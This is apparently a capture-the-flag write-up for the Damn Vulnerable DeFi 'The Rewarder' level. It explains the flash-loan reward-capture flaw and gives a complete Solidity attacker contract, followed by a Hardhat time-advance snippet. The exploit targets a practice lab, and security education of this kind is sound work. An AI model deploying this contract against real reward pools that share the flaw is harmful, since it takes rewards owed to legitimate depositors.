# Intro

There's a pool offering rewards in tokens every 5 days for those who deposit their DVT tokens into it.

Alice, Bob, Charlie and David have already deposited some DVT tokens, and have won their rewards!

You don't have any DVT tokens. But in the upcoming round, you must claim most rewards for yourself.

Oh, by the way, rumours say a new pool has just landed on mainnet. Isn't it offering DVT tokens in flash loans?

# Glossary

- **Currency Peg**: It is a monetary policy in which an entity sets a specific fixed exchange rate for its own currency with a foreign currency.

- **ERC20 snapshot**: When a snapshot is created, the balances and total supply at the time are recorded for later access. To get the total supply at the time of a snapshot, call the function totalSupplyAt with the snapshot id. To get the balance of an account at the time of a snapshot, call the balanceOfAt function with the snapshot id and the account address.

# Attack explanation

In order to beat the level, we need to wait for the next round of rewards to start, and get a flash loan for all DVT tokens. Then deposit our loaned DVT tokens into the rewarder pool. This will trigger a distribute rewards back to us and we will get all the rewards from the round. Immediately we need to call withdraw to claim the rewards and repay the DVT flash loan back to the flash loaner pool. Then we can transfer the rewards tokens back to us.

# Attack function

We can create the following attacker contract to make the attack:

```
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./TheRewarderPool.sol";
import "./FlashLoanerPool.sol";
import "./RewardToken.sol";

/**
 * @title AttackerContractRewarder
 * @author Juan Farber (github.com/Farber98)
 */

contract AttackerContractRewarder {
    TheRewarderPool public rewarderPool;
    FlashLoanerPool public flashLoanerPool;
    IERC20 public token;
    IERC20 public reward;

    constructor(
        address _flashLoanerPool,
        address _rewarderPool,
        IERC20 _token,
        IERC20 _rewardToken
    ) {
        flashLoanerPool = FlashLoanerPool(_flashLoanerPool);
        rewarderPool = TheRewarderPool(_rewarderPool);
        token = _token;
        reward = _rewardToken;
    }

    function attack() external payable {
        // Calls the loan.
        flashLoanerPool.flashLoan(token.balanceOf(address(flashLoanerPool)));

        // Get rewards.
        reward.transfer(msg.sender, reward.balanceOf(address(this)));
    }

    // To receive the loan.
    fallback() external payable {
        uint256 balance = token.balanceOf(address(this));

        // Approve rewarder pool.
        token.approve(address(rewarderPool), balance);

        // Deposits into rewarder pool.
        rewarderPool.deposit(balance);

        // Withdraw rewards.
        rewarderPool.withdraw(balance);

        // Repay loan.
        token.transfer(address(flashLoanerPool), balance);
    }
}

```

And the trick to pass the tests is to increase evm time:

```
const fiveDays = 5 * 24 * 60 * 60;
await ethers.provider.send("evm_increaseTime", [fiveDays]);
await ethers.provider.send("evm_mine");
```
